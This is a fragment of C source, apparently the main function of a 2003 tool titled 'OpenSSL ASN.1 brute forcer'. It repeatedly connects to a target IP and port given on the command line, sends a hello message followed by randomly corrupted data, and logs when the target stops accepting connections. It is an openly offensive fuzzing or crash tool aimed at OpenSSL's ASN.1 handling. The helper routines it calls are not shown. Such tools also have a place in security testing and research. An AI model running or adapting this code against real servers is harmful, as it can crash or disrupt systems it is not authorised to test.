int main(int argc, char *argv[])
{
	struct sockaddr_in addr;
	int s, port = 0, first = 1, len;
	char *host = NULL;
	unsigned int seed;
	struct timeval tv;

	printf("OpenSSL ASN.1 brute forcer (Syzop/2003)\n\n");
	
	if (argc != 3) {
		fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
		exit(1);
	}

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stderr, "Port out of range (%d)\n", port);
		exit(1);
	}

	gettimeofday(&tv, NULL);
	seed = (getpid() ^ tv.tv_sec) + (tv.tv_usec * 1000);

	printf("seed = %u\n", seed);
	srand(seed);

	memset(&addr, 0, sizeof(addr));


	signal(SIGPIPE, SIG_IGN); /* Ignore SIGPIPE */

while(1)
{

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(host);
	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stderr, "Unable to connect: %s\n", strerror(errno));
		if (!first)
			diffit();
		exit(EXIT_FAILURE);
	}
	first = 0;
	printf("."); fflush(stdout);

	len = send_hello();
	write(s, buf, len);
	len = send_crap();
	corruptor(buf, len);
	write(s, buf, len);
	usleep(1000); /* wait.. */
	close(s);
}
	
	exit(EXIT_SUCCESS);
}